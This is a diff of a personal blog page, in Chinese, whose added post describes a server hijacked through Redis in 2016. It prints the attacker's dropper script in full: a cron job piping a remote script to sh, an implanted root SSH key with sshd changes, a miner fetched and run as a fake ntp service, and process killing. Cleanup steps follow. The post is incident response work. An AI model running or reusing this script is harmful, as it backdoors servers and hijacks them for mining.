@@ -4,16 +4,16 @@
   <meta charset="utf-8">
   <meta name="google-site-verification" content="B6QNJ8N2Q7hbnMncyrM5GMCWgK-vIAEx0o2DQre64ls" />
   
-  <title>第 2 页 | t1ger的茶馆</title>
+  <title>Recent Redis hacking | t1ger的茶馆</title>
   <meta name="author" content="t1ger">
   
-  <meta name="description" content="https://t1ger.github.io/">
+  <meta name="description" content="hacking redis server">
   
 
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  
+  <meta property="og:title" content="Recent Redis hacking"/>
   <meta property="og:site_name" content="t1ger的茶馆"/>
 
   
@@ -110,143 +110,61 @@
 	  <div class="container" >
 	    <div class="row">
 	
-	<div class="col-md-9">
+	<div class="col-md-9 center-content">
 	
 
 		<div class="content">
 			<!-- index -->
 		   
-				
-		            <div class="index-item-wrapper">
-		              <h3>
-		                <a class="post-title" href="/2016/09/16/openldap集成系列/">openldap集成系列</a>
-		              </h3>
-									<span class="post-time">2016-09-15</span>
-		              <div class="excerpt"></div>
-		              
-		            </div>
-				
-		            <div class="index-item-wrapper">
-		              <h3>
-		                <a class="post-title" href="/2016/09/15/svn镜像的快速实现/">svn镜像的快速实现</a>
-		              </h3>
-									<span class="post-time">2016-09-15</span>
-		              <div class="excerpt"></div>
-		              
-		            </div>
-				
-		            <div class="index-item-wrapper">
-		              <h3>
-		                <a class="post-title" href="/2016/09/13/mysql-字段自定义排序问题/">mysql 字段自定义排序问题</a>
-		              </h3>
-									<span class="post-time">2016-09-13</span>
-		              <div class="excerpt"></div>
-		              
-		            </div>
-				
-		            <div class="index-item-wrapper">
-		              <h3>
-		                <a class="post-title" href="/2016/09/13/五分钟快速了解-MySQL8新特性/">五分钟快速了解 MySQL8新特性</a>
-		              </h3>
-									<span class="post-time">2016-09-13</span>
-		              <div class="excerpt"></div>
-		              
-		            </div>
-				
-		            <div class="index-item-wrapper">
-		              <h3>
-		                <a class="post-title" href="/2016/09/09/提高工作效率之vim篇/">提高工作效率之vim篇</a>
-		              </h3>
-									<span class="post-time">2016-09-09</span>
-		              <div class="excerpt"></div>
-		              
-		            </div>
-				
-		            <div class="index-item-wrapper">
-		              <h3>
-		                <a class="post-title" href="/2016/09/08/nginx-proxy-pass常用知识点解析/">nginx proxy_pass常用知识点解析</a>
-		              </h3>
-									<span class="post-time">2016-09-08</span>
-		              <div class="excerpt"></div>
-		              
-		            </div>
-				
-				<!-- archives -->
+
+			  		<h2>Recent Redis hacking</h2>
+					
+					<div>
+						<span class="post-time">2016-11-04 14:18:04</span>
+					</div>	
+					
+
+					<div class="article-content">
+						<p>早上接到cpu负载报警，发现服务器被黑了，又成人家肉鸡了。</p>
+<p>登陆系统查看，发下防火墙被关了，crontab被清空重写了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#crontab -l</div><div class="line">*/10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?106 | sh</div></pre></td></tr></table></figure>
+<p>查看脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin</div><div class="line"></div><div class="line">echo &quot;*/10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?106 | sh&quot; &gt; /var/spool/cron/root</div><div class="line">mkdir -p /var/spool/cron/crontabs</div><div class="line">echo &quot;*/10 * * * * curl -fsSL http://r.chanstring.com/pm.sh?106 | sh&quot; &gt; /var/spool/cron/crontabs/root</div><div class="line"></div><div class="line">if [ ! -f &quot;/root/.ssh/KHK75NEOiq&quot; ]; then</div><div class="line">	mkdir -p ~/.ssh</div><div class="line">	rm -f ~/.ssh/authorized_keys*</div><div class="line">	echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzwg/9uDOWKwwr1zHxb3mtN++94RNITshREwOc9hZfS/F/yW8KgHYTKvIAk/Ag1xBkBCbdHXWb/TdRzmzf6P+d+OhV4u9nyOYpLJ53mzb1JpQVj+wZ7yEOWW/QPJEoXLKn40y5hflu/XRe4dybhQV8q/z/sDCVHT5FIFN+tKez3txL6NQHTz405PD3GLWFsJ1A/Kv9RojF6wL4l3WCRDXu+dm8gSpjTuuXXU74iSeYjc4b0H1BWdQbBXmVqZlXzzr6K9AZpOM+ULHzdzqrA3SX1y993qHNytbEgN+9IZCWlHOnlEPxBro4mXQkTVdQkWo0L4aR7xBlAdY7vRnrvFav root&quot; &gt; ~/.ssh/KHK75NEOiq</div><div class="line">	echo &quot;PermitRootLogin yes&quot; &gt;&gt; /etc/ssh/sshd_config</div><div class="line">	echo &quot;RSAAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config</div><div class="line">	echo &quot;PubkeyAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config</div><div class="line">	echo &quot;AuthorizedKeysFile .ssh/KHK75NEOiq&quot; &gt;&gt; /etc/ssh/sshd_config</div><div class="line">	/etc/init.d/sshd restart</div><div class="line">fi</div><div class="line"></div><div class="line">if [ ! -f &quot;/etc/init.d/ntp&quot; ]; then</div><div class="line">	if [ ! -f &quot;/etc/systemd/system/ntp.service&quot; ]; then</div><div class="line">		mkdir -p /opt</div><div class="line">		curl -fsSL http://r.chanstring.com/v51/lady_`uname -m` -o /opt/KHK75NEOiq33 &amp;&amp; chmod +x /opt/KHK75NEOiq33 &amp;&amp; /opt/KHK75NEOiq33 -Install</div><div class="line">	fi</div><div class="line">fi</div><div class="line"></div><div class="line">/etc/init.d/ntp start</div><div class="line"></div><div class="line">ps auxf|grep -v grep|grep &quot;/usr/bin/cron&quot;|awk &apos;&#123;print $2&#125;&apos;|xargs kill -9</div><div class="line">ps auxf|grep -v grep|grep &quot;/opt/cron&quot;|awk &apos;&#123;print $2&#125;&apos;|xargs kill -9</div></pre></td></tr></table></figure>
+<p>分析脚本，我们需要删除相应程序及进程</p>
+<ul>
+<li>清理crontab 任务</li>
+<li>清理.ssh/KHK75NEOiq,恢复/etc/ssh/sshd_config文件或者用其他服务器文件替换，并重启sshd服务。</li>
+<li>清理 /etc/init.d/ntp删除并kill掉它启动的进程</li>
+<li>清理/usr/local/etc/minerd.conf </li>
+</ul>
+<p>通过top观察负载，查看是否有minerd进程及ntp进程。</p>
+<hr>
+<p>您的鼓励是我写作最大的动力</p>
+<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
+
+							<!-- 支付宝打赏图案 -->
+      						<div id="donate_guide" class="donate_bar center ">
+          					<a href="http://t1.qpic.cn/mblogpic/79e13bdabc9da2a299ee/2000" title="支付宝打赏" class="fancybox" rel="article0"       style="float:left;margin-left:25%;margin-right:2px;">
+          					<img src="http://t1.qpic.cn/mblogpic/79e13bdabc9da2a299ee/2000" title="支付宝打赏" height="164px" width="164px">
+          					</a> 
+      						</div>
+					</div>
+
+			  <!-- about -->
 			  
 		</div>
 
 		<!-- pagination -->
 	  
 
-			<div class="btn-group btn-group-justified">
-				
-
-					<a class="btn btn-default " href="/" >上一页</a>
-
-					<a class="btn btn-default" href="/">首页</a>
-
-					<a class="btn btn-default disabled" href="/" >下一页</a>
-
-	    	
-			</div>
-	  
-
 		<div class="comment-section">
   
+  
+
 
 </div>
 	</div>
 
-	
-		<div class="col-md-3">
-			<div id="sidebar">
-		</div>
-			
-					
-<div class="widget">
-  <h4>最新文章</h4>
-  <ul class="entry list-unstyled">
-    
-      <li>
-        <a href="/2016/11/04/Recent-Redis-hacking/"  title="hacking redis server"  > <i class="mdi-editor-insert-drive-file"></i>Recent Redis hacking</a>
-      </li>
-    
-      <li>
-        <a href="/2016/10/31/Pinba-Server-install-on-centos6-4/"  > <i class="mdi-editor-insert-drive-file"></i>Pinba Server install on centos6.4</a>
-      </li>
-    
-      <li>
-        <a href="/2016/10/26/python属性-property-的理解/"  > <i class="mdi-editor-insert-drive-file"></i>python属性(property)的理解</a>
-      </li>
-    
-      <li>
-        <a href="/2016/10/25/python闭包的理解/"  > <i class="mdi-editor-insert-drive-file"></i>python闭包的理解</a>
-      </li>
-    
-      <li>
-        <a href="/2016/10/17/Meteor-Tutorial-Build-chat-Web-Applications-with-Meteor/"  title="Meteor tutorial about web Applications"  > <i class="mdi-editor-insert-drive-file"></i>Meteor Tutorial: Build chat Web Applications with Meteor</a>
-      </li>
-    
-  </ul>
-</div>
-
-
-				
-					
-<div class="widget">
-	<h4>链接</h4>
-	<ul class="blogroll list-unstyled">
-	
-		<li> <a href="https://www.github.com/t1ger" title="t1ger的茶馆" target="_blank"> <i class="mdi-action-launch"></i> GitHub</a></li>
-	
-		<li> <a href="https://t1ger.github.io" title="t1ger的茶馆" target="_blank"> <i class="mdi-action-launch"></i> QQ</a></li>
-	
-	</ul>
-</div>
-
-
-				
-			</div>
 	
 
 </div>
